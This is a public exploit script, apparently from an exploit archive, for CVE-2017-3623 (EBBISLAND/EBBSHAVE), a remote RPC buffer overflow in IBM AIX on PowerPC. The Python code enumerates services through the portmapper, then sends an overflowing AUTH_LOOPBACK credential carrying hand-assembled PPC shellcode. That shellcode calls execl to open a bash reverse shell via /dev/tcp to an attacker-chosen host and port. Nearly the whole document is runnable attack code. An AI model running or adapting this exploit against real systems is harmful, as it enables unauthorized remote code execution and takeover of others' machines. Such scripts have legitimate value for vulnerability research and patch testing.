# Exploit Title: EBBISLAND EBBSHAVE 6100-09-04-1441 - Remote Buffer Overflow
# Date: 2018-09-19
# Exploit Author: Harrison Neal
# Vendor Homepage: https://www.ibm.com/us-en/
# Version: 6100-09-04-1441, 7100-03-05-1524, 7100-04-00-0000, 7200-01-01-1642
# Tested on: IBM AIX PPC
# CVE: CVE-2017-3623
# EBBISLAND / EBBSHAVE RPC Buffer Overflow for IBM AIX PPC


#!/usr/bin/python
# Usage: ebbshave-aixgeneric-v1.py rhost lhost lport gid_base execl_func execl_toc

# Exploit code example; shellcode requires /usr/bin/bash on the target

# Example values for my AIX 7.2 LPAR:
# gid_base: 3007d390
# execl_func: d0307940
# execl_toc: f081bc20

# CAUTION: If a RPC service repeatedly crashes, it can be automatically disabled

from os import urandom
from socket import socket, AF_INET, SOCK_STREAM
from struct import pack, unpack
from sys import argv, exit
from time import time, sleep

def getCredLoopbackBody():
	global gid_base, rhost, lhost, lport, gid_base, execl_func, execl_toc

	epoch = pack('>I', time()) # Make sure the system clock is in sync w/ target

	# Doesn't matter, ljust call assumes len <= 4
	node_name = 'hn'
	node_length = pack('>I', len(node_name))
	node_name = node_name.ljust(4, '\x00')

	# Also doesn't matter
	uid = pack('>I', 0)
	gid = pack('>I', 0)

	# Big enough to trigger an overflow
	# Not big enough to trigger defensive code
	# You could make this a little bit less,
	# but you'd have to tweak the part 2 code
	gids_len = pack('>I', 64)

	base_addr = pack('>I', gid_base)
	addr_8c = pack('>I', gid_base + 0x8c)
	addr_a8 = pack('>I', gid_base + 0xa8)
	addr_4c = pack('>I', gid_base + 0x4c)

	func_addr = pack('>I', execl_func)
	toc_addr = pack('>I', execl_toc)

	cmd = 'bash -i >& /dev/tcp/' + lhost + '/' + lport + ' 0>&1'
	cmd = cmd.ljust(0x30, '\x00')

	# Each GID is 4 bytes long, we want 64
	gids = (
		# +0x0 # filepath
		'/usr/bin/bash\x00\x00\x00'

		# +0x10 # argv[0]
		'bash\x00\x00\x00\x00'

		# +0x18 # argv[1]
		'-c\x00\x00'

		# +0x1c # argv[2]
	) + cmd + (

		# +0x4c # r3 = filepath
		'\x70\x63\x00\x00' # andi. r3, r3, 0x0
		'\x3c\x60'
	) + base_addr[0:2] + ( # lis r3, ...
		'\x60\x63'
	) + base_addr[2:4] + ( # ori r3, r3, ...

		# +0x58 # r4 = argv[0]
		'\x38\x83\x00\x10' # addi r4, r3, 0x10

		# +0x5c # r5 = argv[1]
		'\x38\xa4\x00\x08' # addi r5, r4, 0x8

		# +0x60 # r6 = argv[2]
		'\x38\xc5\x00\x04' # addi r6, r5, 0x4

		# +0x64 # r7 = NULL
		'\x70\xe7\x00\x00' # andi. r7, r7, 0x0

		# +0x68 # r2 = libc.a TOC for execl
		'\x70\x42\x00\x00' # andi. r2, r2, 0x0
		'\x3c\x40'
	) + toc_addr[0:2] + ( # lis r2, ...
		'\x60\x42'
	) + toc_addr[2:4] + ( # ori r2, r2, ...

		# +0x74 # execl
		'\x71\x08\x00\x00' # andi. r8, r8, 0x0
		'\x3d\x00'
	) + func_addr[0:2] + ( # lis r8, ...
		'\x61\x08'
	) + func_addr[2:4] + ( # ori r8, ...
		'\x7d\x09\x03\xa6' # mtctr r8
		'\x4e\x80\x04\x21' # bctrl

		# +0x88 # 0x14 padding
		'AAAAAAAAAAAAAAAAAAAA'

		# +0x9c # Will be NULL
		'ZZZZ'

		# +0xa0
		# @+948: r5 = +0x8c
		# @+968: r5 = *(+0x8c + 0x18) = *(+0xa4)

		# +0xa4
		# @+968: r5 = +0xa8
		# @+972: r0 = *(r5 + 0x0) = *(+0xa8)

		# +0xa8
		# @+972: r0 = +0x4c
		# @+980: ctr = r0 = +0x4c
		# @+988: branch to ctr
	) + addr_8c + addr_a8 + addr_4c + (

		# +0xac # padding
		'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
	)

	print ":".join("{:02x}".format(ord(c)) for c in gids)
	print len(gids)

	return epoch + node_length + node_name + uid + gid + gids_len + gids

def getCredLoopback():
	cred_flavor = pack('>I', 0x55de) # AUTH_LOOPBACK

	cred_body = getCredLoopbackBody()
	cred_len = pack('>I', len(cred_body))

	return cred_flavor + cred_len + cred_body

def getAuthNone():
	auth_flavor = pack('>I', 0) # AUTH_NONE

	auth_len = pack('>I', 0)

	return auth_flavor + auth_len

def getMessage(prog_num, ver_num, proc_num, use_loopback_cred):
	xid = urandom(4)

	mtype = pack('>I', 0) # CALL

	rpcvers = pack('>I', 2)

	prog = pack('>I', prog_num)
	vers = pack('>I', ver_num)

	proc = pack('>I', proc_num)

	cred = ( getCredLoopback() if use_loopback_cred else getAuthNone() )

	verf = getAuthNone()

	return xid + mtype + rpcvers + prog + vers + proc + cred + verf

def getPacket(message):
	# MSB on = this is the last fragment
	# LSBs = fragment length
	frag = pack('>I', len(message) + 0x80000000)

	return frag + message

if len(argv) < 7:
	print 'Usage: ebbshave-aixgeneric-v1.py rhost lhost lport gid_base execl_func execl_toc'
	exit(1)

rhost = argv[1]
lhost = argv[2]
lport = argv[3]
gid_base = int(argv[4], 16)
execl_func = int(argv[5], 16)
execl_toc = int(argv[6], 16)

# Query the portmapper for services

services = []

s = socket(AF_INET, SOCK_STREAM)
s.connect((rhost, 111)) # port 111 for portmapper
s.send(getPacket(getMessage(
	100000,	# portmapper
	2,	# version 2
	4,	# DUMP
	False	# unauth request
	)))

s.recv(0x1c) # skip over fragment length, XID, message type, reply state, verifier, accept state

while list(unpack('>I', s.recv(4)))[0]: # while next "value follows" field is true
	prog_num, ver_num, proto_num, port = unpack('>IIII', s.recv(16))
	if (prog_num == 100024 # status
		and proto_num == 6): # TCP
			print '[ ] Found service ' + str(prog_num) + ' v' + str(ver_num) + ' on TCP port ' + str(port)
			services.append((prog_num, ver_num, port))

s.close()

# Try attacking

for service in services:
	prog_num, ver_num, port = service

	serv_str = str(prog_num) + ' v' + str(ver_num)

	for attack in [False, True]:
		sleep(1) # be gentle

		print '[ ] ' + ( 'Attacking' if attack else 'Pinging' ) + ' ' + serv_str

		s = socket(AF_INET, SOCK_STREAM)
		s.connect((rhost, port))

		resp_len = 0

		s.send(getPacket(getMessage(
			prog_num,
			ver_num,
			0,	# NULL, acts like a ping
			attack
			)))

		s.settimeout(5) # give inetd/... a chance to spin up the service if needed

		try:
			resp_len = len( s.recv(1024) ) # try to receive up to 1024 bytes
		except:
			resp_len = 0 # typically either timeout, connection error, or Ctrl+C

		try:
			s.close() # try closing the connection if it isn't already dead
		except:
			pass # connection is probably already dead

		print '[ ] Got response length ' + str(resp_len)

		if resp_len == 0: # suspect the service either timed out or crashed
			if attack:
				print '[+] Probably vulnerable to EBBSHAVE, hopefully you have a shell'
			else:
				print '[-] Service probably down or otherwise misbehaving, skipping...'
				break